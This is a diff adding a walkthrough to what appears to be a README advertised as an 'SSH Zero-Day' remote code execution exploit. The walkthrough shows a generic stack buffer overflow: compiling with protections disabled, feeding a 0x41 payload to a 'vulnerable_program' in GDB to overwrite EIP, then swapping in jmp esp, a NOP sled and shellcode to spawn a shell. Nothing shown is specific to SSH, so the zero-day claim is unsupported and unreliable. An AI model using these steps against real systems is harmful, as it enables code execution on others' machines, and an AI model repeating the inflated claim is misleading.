@@ -1,3 +1,29 @@
+How This Works
+Overflows the buffer with 0x41 ('A') characters.
+Overwrites the return address with 0x41414141 (arbitrary controlled value).
+Writes the exploit payload to a file (/tmp/exploit_payload).
+Executes the vulnerable program with the payload, causing a segmentation fault or arbitrary code execution.
+Step 1: Compile the Exploit
+gcc exploit.c -o exploit -fno-stack-protector -z execstack -g
+Step 2: Run the Exploit
+./exploit
+Step 3: Debug the Vulnerable Program
+Run the vulnerable program in GDB to confirm memory corruption
+gdb -q ./vulnerable_program
+(gdb) run $(cat /tmp/exploit_payload)
+(gdb) info registers
+(gdb) x/20x $esp
+
+Look for the following code
+EIP Overwrite (EIP = 0x41414141)
+Segmentation Fault indicating successful corruption.
+
+Next Steps
+If the program crashes with 0x41414141 in EIP, it's exploitable.
+Replace 0x41414141 with a jump to shellcode (jmp esp).
+Inject NOP sled + shellcode to spawn a shell.
+
+
 | # SSH Remote Code Execution |
 | SSH Zero-Day | Made By ClumsyLulz | Taylor Christian Newsome |
 Summary: 
